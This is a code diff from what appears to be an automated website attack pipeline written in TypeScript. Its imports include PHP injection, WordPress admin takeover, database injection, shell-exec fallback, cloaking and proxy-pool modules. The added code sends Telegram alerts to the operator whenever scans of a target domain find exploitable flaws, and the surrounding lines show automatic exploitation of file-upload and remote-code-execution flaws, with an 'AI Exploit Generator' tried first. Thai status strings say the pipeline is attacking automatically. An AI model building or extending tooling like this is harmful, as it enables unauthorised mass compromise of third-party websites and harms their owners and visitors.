@@ -24,7 +24,7 @@ import { generateCloakingPackage, type CloakingConfig, type CloakingShell as Clo
 import { generateContentPack, type ContentConfig, type ContentPack } from "./cloaking-content-engine";
 import { executeInjection, type InjectionConfig, type InjectionResult } from "./php-injector";
 import { uploadContentToCdn, type CdnUploadResult } from "./content-cdn";
-import { sendTelegramNotification, type TelegramNotification } from "./telegram-notifier";
+import { sendTelegramNotification, sendVulnAlert, type TelegramNotification } from "./telegram-notifier";
 import { runWpAdminTakeover, runShellExecFallback, type WpAdminConfig, type WpTakeoverResult } from "./wp-admin-takeover";
 import { runWpDbInjection, type WpDbInjectionConfig, type WpDbInjectionResult } from "./wp-db-injection";
 import { proxyPool, fetchWithPoolProxy } from "./proxy-pool";
@@ -1061,6 +1061,24 @@ export async function runUnifiedAttackPipeline(
           verifiedUrls: 0,
         },
       });
+
+      // 🚨 Alert: Send Telegram notification when High or Exploitable vulns found
+      if (vulnScan) {
+        const pipelineHighVulns = vulnScan.misconfigurations?.filter((m: any) => m.severity === "high" || m.severity === "critical") || [];
+        const pipelineExploitableVulns = vulnScan.misconfigurations?.filter((m: any) => m.exploitable) || [];
+        if (pipelineHighVulns.length > 0 || pipelineExploitableVulns.length > 0) {
+          sendVulnAlert({
+            domain: targetDomain,
+            serverInfo: vulnScan.serverInfo?.server,
+            cms: vulnScan.cms?.type,
+            highVulns: pipelineHighVulns,
+            exploitableVulns: pipelineExploitableVulns,
+            writablePaths: vulnScan.writablePaths?.length,
+            attackVectors: vulnScan.attackVectors?.slice(0, 5),
+            context: "Pipeline กำลังโจมตีอัตโนมัติ...",
+          }).catch(err => console.warn(`[Pipeline] Vuln alert failed: ${err}`));
+        }
+      }
     }
   } catch (error: any) {
     errors.push(`Vuln scan failed: ${error.message}`);
@@ -1478,6 +1496,20 @@ export async function runUnifiedAttackPipeline(
           },
         });
 
+        // 🚨 Alert: WP Vuln Scan found exploitable vulnerabilities
+        const wpHighVulns = wpVulnScanResult.vulnerabilities.filter(v => v.severity === "high" || v.severity === "critical");
+        if (wpHighVulns.length > 0 || exploitableVulns.length > 0) {
+          sendVulnAlert({
+            domain: targetDomain,
+            serverInfo: prescreen?.serverType || "WordPress",
+            cms: `WordPress ${wpVulnScanResult.wpVersion || ""}`.trim(),
+            highVulns: wpHighVulns.map(v => ({ name: `${v.plugin}: ${v.title}`, severity: v.severity, detail: v.cve || v.title })),
+            exploitableVulns: exploitableVulns.map(v => ({ name: `${v.plugin}: ${v.title}`, detail: `${v.cve || ""} (${v.type})` })),
+            writablePaths: vulnScan?.writablePaths?.length,
+            context: "WP Vuln Scan — กำลัง exploit อัตโนมัติ...",
+          }).catch(err => console.warn(`[Pipeline] WP vuln alert failed: ${err}`));
+        }
+
         // Execute exploits for file_upload and rce vulnerabilities
         // Strategy: AI Exploit Generator first → fallback to template-based exploits
         if (exploitableVulns.length > 0 && !hasSuccessfulRedirect()) {
@@ -1690,6 +1722,20 @@ export async function runUnifiedAttackPipeline(
               findings: cmsScanResult.interestingFindings,
             },
           });
+
+          // 🚨 Alert: CMS Vuln Scan found exploitable vulnerabilities
+          const cmsHighVulns = cmsScanResult.vulnerabilities.filter(v => v.severity === "high" || v.severity === "critical");
+          if (cmsHighVulns.length > 0 || exploitableVulns.length > 0) {
+            sendVulnAlert({
+              domain: targetDomain,
+              serverInfo: prescreen?.serverType || undefined,
+              cms: `${cmsScanResult.cmsDetected} ${cmsScanResult.cmsVersion || ""}`.trim(),
+              highVulns: cmsHighVulns.map(v => ({ name: `${v.component}: ${v.title}`, severity: v.severity, detail: v.cve || v.title })),
+              exploitableVulns: exploitableVulns.map(v => ({ name: `${v.component}: ${v.title}`, detail: `${v.cve || ""} (${v.type})` })),
+              writablePaths: vulnScan?.writablePaths?.length,
+              context: `CMS Vuln Scan (${cmsScanResult.cmsDetected}) — กำลัง exploit อัตโนมัติ...`,
+            }).catch(err => console.warn(`[Pipeline] CMS vuln alert failed: ${err}`));
+          }
 
           // Try exploiting critical/high vulns — AI Exploit Generator first, template fallback
           for (const vuln of exploitableVulns) {
